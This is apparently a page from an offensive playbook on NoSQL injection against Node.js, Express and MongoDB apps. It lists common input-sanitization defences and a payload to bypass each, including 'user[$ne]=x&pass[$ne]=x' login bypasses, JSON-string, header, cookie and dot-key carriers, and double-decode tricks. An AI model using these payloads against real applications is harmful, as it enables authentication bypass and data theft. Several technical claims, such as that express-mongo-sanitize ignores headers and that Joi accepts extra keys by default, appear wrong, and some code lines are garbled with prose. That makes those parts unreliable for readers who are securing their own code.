# Filter evasion deep — every sanitization shape and its bypass

## `express-mongo-sanitize` — the default

```javascript
const mongoSanitize = require('express-mongo-sanitize')
app.use(mongoSanitize())
// strips keys starting with $ and containing .
```

The middleware mutates `req.body`/`req.query`/`req.params` in place:
`{"user": {"$ne": null}}` → `{"user": {}}`. Bypasses:

- `allowDots` variant — `{"profile.role": "x"}` — also stripped by default
  (`removeDots`), so the dot-carrier dies too
- JSON-string inside a value — `{"filter": "{\"$ne\":null}"}` parsed later
  — the sanitize only sees a string
- `onSanitize`/`dryRun`/`replaceWith` config gaps
- headers not covered — `req.headers` untouched
- `params`/`body`/`query` — check WHICH the middleware mounts on

## `mongoose.sanitizeFilter` — the model-side

```javascript
Model.findOne(mongoose.sanitizeFilter(req.body))
```

Strips top-level `$` and `.` keys — the same evasions as
`express-mongo-sanitize`, plus it does NOT recurse into nested objects
the same way in older versions — `{"user": {"x": {"$ne": null}}}` may
survive where `{"user": {"$ne": null}}` is stripped... but a nested
`$ne` under a non-operator key is a SUBDOC filter, not operator — only
helps when the app itself does `Object.assign` to flatten.

## `String(...)` coercion — the kill

```javascript
User.findOne({user: String(req.body.user)})
```

`{$ne: null}` → `"[object Object]"` — dead. No bypass on this field;
find another field that is NOT coerced (`pass`, a `filter`/`where`
wrapper, a `_id`, a nested `profile.x`).

## `typeof` / `is-string` checks — the reject

```javascript
if (typeof req.body.user !== 'string') return 400
if (!lodash.isString(req.body.user)) return 400
if (typeof req.body.user === 'object') return 400
```

Dead for that field — same "find another field" response. Watch for a
check on `user` but not `pass` — `pass[$ne]=` bypasses a `user`-only
guard.

## `qs` depth-limit — `a[b][c][d][e][f]=x`

`depth: 5` default — beyond it the key stays literal — `carrier-qs-deep.md`.
A 4-deep nest `user[a][b][c][$ne]=x` still parses; the operator can sit
at the LAST level only if the app passes `user.a.b.c` as the filter —
rare, but `user[$ne]=x` under `depth: 0` becomes `{"user[$ne]": "x"}` —
flat.

## `qs` `plainObjects`/`allowPrototypes` — the proto-block

`allowPrototypes: false` (default) — `__proto__`/`constructor`/`prototype`
blocked — those are PP carriers not NoSQLi; for NoSQLi the only angle is
`constructor` as a KEY — `{"user": {"constructor": {"$ne": null}}}` —
a subdoc-filter, harmless.

## The `Joi`/`zod`/`ajv` validators — the schema

```javascript
const schema = Joi.object({user: Joi.string().required(), pass: Joi.string()})
const schema = z.object({user: z.string(), pass: z.string()})
const schema = {type: 'object', properties: {user: {type: 'string'}}, additionalProperties: false}
```

`Joi.string()`/`z.string()`/`type: 'string'` rejects objects — dead.
The bypass: `additionalProperties: true` (default in ajv/Joi) lets
EXTRA keys through — `{"$or": [...]}` as a sibling key, or an
unvalidated `filter`/`where`/`q` field — `injection-points.md`.

## The `JSON.parse` + `Object.assign` — the late-merge

```javascript
const q = Object.assign({}, req.query, JSON.parse(req.body.filter))
User.findOne(q)
```

The sanitize ran on `req.query` BEFORE the merge — the `filter` string
carries the object late — `{"filter": "{\"$or\":[...]}"}` survives a
`sanitizeFilter(req.query)` because it was a STRING then.

## The `Object.keys`/`Object.entries` rebuild — the re-object

```javascript
const filter = {}
for (const [k, v] of Object.entries(req.body)) {
  filter[k] = typeof v === 'string' ? v : v   — noop
}
```

A per-key rebuild that FORWARDS objects uncoerced — the object survives
through the loop — `whitebox-hunt.md` — grep for `Object.entries`/
`Object.keys`/`for...in`/`for...of` rebuilds.

## The `pick`/`omit`/`lodash` — the field-filter

```javascript
const filter = _.pick(req.body, ['user', 'pass'])
const filter = _.omit(req.body, ['$where'])
const filter = _.pick(req.body, k => !k.startsWith('$'))
```

`pick` drops non-listed keys — `$or`/`$where` as SIBLINGS die, but
`user[$ne]` under `user` survives if `user` is picked and its VALUE is
an object — `pick` copies the value verbatim, not just scalars.

## The `qs`-then-JSON — the double-decode

```text
user=%7B%22%24ne%22%3Anull%7D   → "{"$ne":null}" — a string
```

then `JSON.parse(req.body.user)` — the late-parse carries the object —
`carrier-json-deep.md`.

## The `decodeURIComponent` — the double-decode

```javascript
const q = decodeURIComponent(req.query.q)  → "user[$ne]=x"
const filter = qs.parse(q)
```

A second `qs.parse` on a decoded string — the `%5B`/`%5D`/`%24`-encoded
brackets survive a FIRST-pass sanitize — `filter-bypass.md`.

## The `flatten`/`unflatten` — the key-flatten

```javascript
const flat = require('flat')
const q = flat.unflatten(req.body)
```

`unflatten` turns `{"user.$ne": "x"}` back into `{"user": {"$ne": "x"}}`
— a DOT-key carrier that survives `sanitizeFilter` (which strips
`$`-keys but leaves the STRING `"user.$ne"` untouched) — `filter-bypass.md`.

## The `set-value`/`deep-set` — the path-setter

```javascript
const set = require('set-value')
for (const k of Object.keys(req.body)) set(filter, k, req.body[k])
```

`set-value`/`deep-set`/`dot-prop` — `{"user.$ne": "x"}` →
`filter.user.$ne = "x"` — the path-setter re-objects a flat key —
`filter-bypass.md` — the same shape as `unflatten`.

## The `qs`-in-headers — `x-filter: user[$ne]=x`

```javascript
const filter = qs.parse(req.headers['x-filter'])
User.findOne(filter)
```

A header-qs — `injection-points.md` — the header carrier.

## The `cookie`-carrier — `Cookie: filter=user[$ne]=x`

```javascript
const filter = qs.parse(req.headers.cookie)
const filter = req.cookies.filter  — express cookie-parser
```

The cookie-qs — `injection-points.md`.

## The `body`-carrier — `x-www-form-urlencoded` + `qs`

```javascript
app.use(express.urlencoded({extended: true}))
// user[$ne]=x&pass[$ne]=x → req.body = {user: {$ne: "x"}, pass: {$ne: "x"}}
```

The form-qs — `carrier-qs-deep.md`.

## The `query`-carrier — `?filter[user][$ne]=x`

```javascript
// app.set("query parser", "extended")
// ?filter[user][$ne]=x → req.query.filter = {user: {$ne: "x"}}
```

The query-qs — `injection-points.md`.

## The `qs` `arrayLimit`/`depth`/`parameterLimit` — the caps

`arrayLimit: 20` — `user[20]=x` becomes `{"20": "x"}` — the object-vs-
array confusion — `carrier-qs-deep.md` — an `{"a": {"$in": ...}}` via
`user[20][$in]=x` is an OBJECT at index-20.

## The `qs` `comma` — `a=x,y`

`comma: true` — `a=x,y` → `["x", "y"]` — the array-carrier —
`carrier-qs-deep.md`.

## The `qs` `charsetSentinel` — the `utf8=` marker

`utf8=%E2%9C%93&user[$ne]=x` — the `utf8=✓` marker tells qs to use
utf-8 — the charset-trick — `carrier-qs-deep.md`.

## The `qs` `decoder` — the custom-decode

A custom-decoder can re-parse — `decodeURIComponent` inside the decoder
double-decodes — `filter-bypass.md`.
